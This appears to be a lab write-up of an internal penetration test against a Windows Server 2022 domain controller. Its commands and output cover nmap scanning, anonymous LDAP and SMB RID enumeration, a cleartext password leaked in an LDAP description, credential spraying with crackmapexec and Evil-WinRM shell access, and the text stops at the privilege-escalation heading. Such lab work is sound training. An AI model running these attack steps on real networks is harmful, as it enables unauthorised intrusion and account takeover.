# Active Directory Penetration Testing Lab
This project simulates a real-world internal penetration test in a controlled lab environment. The goal is to compromise a Windows Server 2022 Domain Controller and Internal Network using a Kali Linux attacker machine through enumeration, exploitation, and post-exploitation techniques.

Project Summary

- **Attacker Machine:** Kali Linux
- **Target Machine:** Windows Server 2022 (Active Directory Domain Controller)
- **Domain Name:** `orb.corp0`
- **Objective:** Gain initial access, enumerate the domain, escalate privileges, and extract sensitive data (e.g., password hashes, domain admin credentials).
- **Scope:** Internal black-box test — attacker has direct network access but no initial credentials.

Lab Architecture

| Machine          | Role                            | 
|------------------|---------------------------------|
| Kali Linux       | Attacker                        | 
| Windows Server   | Domain Controller (DC)          | 
| Windows Server   | Internal DC                     |         

## 1. Information Gathering

### Nmap Scan

> **Tool:** `nmap`  
> **Purpose:** Identify open ports and running services on the target system.

```bash
nmap -sCV -p- 192.168.50.129

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  Windows SMB file sharing
464/tcp   open  kpasswd5      Kerberos password change
593/tcp   open  ncacn_http    RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Global Catalog LDAP
3269/tcp  open  tcpwrapped
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0
5985/tcp  open  http          Windows Remote Management (WinRM)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
```
> **Purpose:** Identify open ports and running services on the target system.

## 2. Enumeration

### LDAP Enumeration with NetExec (nxc)

> **Tool:** `nxc`

> **Purpose:** Perform anonymous LDAP queries to extract usernames and domain structure

```bash
nxc ldap 192.168.50.129 -u '' -p '' --users

[*] Total records returned: 67
DC=orb,DC=corp
CN=Administrator,CN=Users,DC=orb,DC=corp
CN=Guest,CN=Users,DC=orb,DC=corp
CN=krbtgt,CN=Users,DC=orb,DC=corp
CN=alice wonderland,CN=Users,DC=orb,DC=corp  
CN=bob builder,CN=Users,DC=orb,DC=corp
CN=jerry cantrell,CN=Users,DC=orb,DC=corp
CN=kurt cobain,CN=Users,DC=orb,DC=corp 
CN=mssql_svc,CN=Users,DC=orb,DC=corp
CN=http_svc,CN=Users,DC=orb,DC=corp
CN=Floor,CN=Users,DC=orb,DC=corp
CN=IT,CN=Users,DC=orb,DC=corp
CN=HR,CN=Users,DC=orb,DC=corp
CN=Management,CN=Users,DC=orb,DC=corp
```
> **Success:** Anonymous access to LDAP allowed us to enumerate domain users and service accounts without credentials. 

### SMB Enumeration with NetExec RID Brute Force

> **Tool:** `nxc`

> **Purpose:** Enumerate RID values via SMB to uncover domain user accounts

```bash
nxc smb 192.168.50.129 -u 'anonymous' -p '' --rid-brute > domainusers.txt
1101: ORB\DnsAdmins (SidTypeAlias)
1102: ORB\DnsUpdateProxy (SidTypeGroup)
1103: ORB\alice.wonderland (SidTypeUser)
1104: ORB\bob.builder (SidTypeUser)
1105: ORB\jerry.cantrell (SidTypeUser)
1106: ORB\kurt.cobain (SidTypeUser)
1107: ORB\dana.scully (SidTypeUser)
1108: ORB\walter.white (SidTypeUser)
1109: ORB\james.bond (SidTypeUser)
1110: ORB\bruce.wayne (SidTypeUser)
```
> **Success:** Successfully enumerated valid domain users and groups using SMB anonymous access with RID brute-forcing

## 3. Exploitation 

Using the usernames previously enumerated, several attacks were launched to gain initial access and extract service account Kerberos tickets for offline password cracking.

### Technique 1: LDAP Description Disclosure

  > **Tool:** `ldapsearch`  
  > **Purpose:** Dump LDAP user attributes and look for password leaks or notes in the `description` field.
  
  ```bash
  ldapsearch -x -H ldap://192.168.50.129 -b "DC=orb,DC=corp" '(objectclass=person)' | grep -ia desc
  ```
  > **Results:**
  > **description:** 3edcxsw2#EDCXSW@
  > A cleartext password was found in the description field — likely a human error or documentation leak.
  
  ### Credentials Spraying
  > Used crackmapexec tool to test the discovered password against all enumerated usernames.
  ```bash
  crackmapexec smb 192.168.50.129 -u users.txt -p '3edcxsw2#EDCXSW@'
  
  [+] orb.corp\clark.kent:3edcxsw2#EDCXSW@ (Pwn3d!)
  ```
  
  >  Valid credentials discovered — clark.kent is a domain user.

### Shell Access via Evil-WinRM

```bash
evil-winrm -i 192.168.50.129 -u clark.kent -p '3edcxsw2#EDCXSW@'

*Evil-WinRM* PS C:\Users\clark.kent\Documents>
```
> Shell access gained on the Domain Controller as a low-privileged user.

### Technique 2: SMB Credentials Spraying Attack

  After enumerating valid usernames from LDAP and RID brute-forcing, credentials spraying attack was performed to discover weak passwords in use within the domain using a custom list of passwords. 
  
  ```bash
  ┌──(arllbartall㉿kali)-[~/Cyber/project1]
  └─$ crackmapexec smb 192.168.50.129 -u users.txt -p passwords.txt     
  SMB         192.168.50.129  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:orb.corp) (signing:True) (SMBv1:False)
  SMB         192.168.50.129  445    DC               [+] orb.corp\alice.wonderland:iloveyou
```
> A valid credential was discovered: alice.wonderland : iloveyou

### Shell Access using Evil-WinRM
```bash
  Info: Establishing connection to remote endpoint
  *Evil-WinRM* PS C:\Users\alice.wonderland\Documents> whoami
  orb\alice.wonderland
  *Evil-WinRM* PS C:\Users\alice.wonderland\Documents> 
```

> After acquiring two valid credentials, we proceeded to enumerate the orivileges the users have for potential privilege escalation.

### alice.wonderland
```bash
  *Evil-WinRM* PS C:\Users\alice.wonderland\Documents> whoami /priv

  PRIVILEGES INFORMATION
  ----------------------
  
  Privilege Name                Description                    State
  ============================= ============================== =======
  SeMachineAccountPrivilege     Add workstations to domain     Enabled
  SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
  SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
  *Evil-WinRM* PS C:\Users\alice.wonderland\Documents> 

```
After Compromising the two accounts, BloodHound was used to map the network and possible paths to further compromise the domain and possibly gain domain admin.


## 4. Privilege Escalation 
